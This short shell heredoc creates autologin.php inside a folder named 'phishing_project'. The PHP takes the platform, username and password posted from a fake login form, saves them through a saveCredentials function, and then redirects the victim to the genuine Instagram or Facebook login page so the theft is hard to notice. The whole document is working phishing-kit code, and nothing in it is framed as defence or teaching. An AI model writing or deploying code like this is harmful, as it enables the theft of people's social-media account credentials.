cat > ~/phishing_project/server/autologin.php << 'PHPEOF'
<?php
session_start();

$platform = $_POST['platform'] ?? '';
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

include_once 'save.php';
saveCredentials($platform, $username, $password);

if ($platform == 'instagram') {
    header("Location: https://www.instagram.com/accounts/login/");
} else {
    header("Location: https://www.facebook.com/login/");
}
exit;
?>
PHPEOF
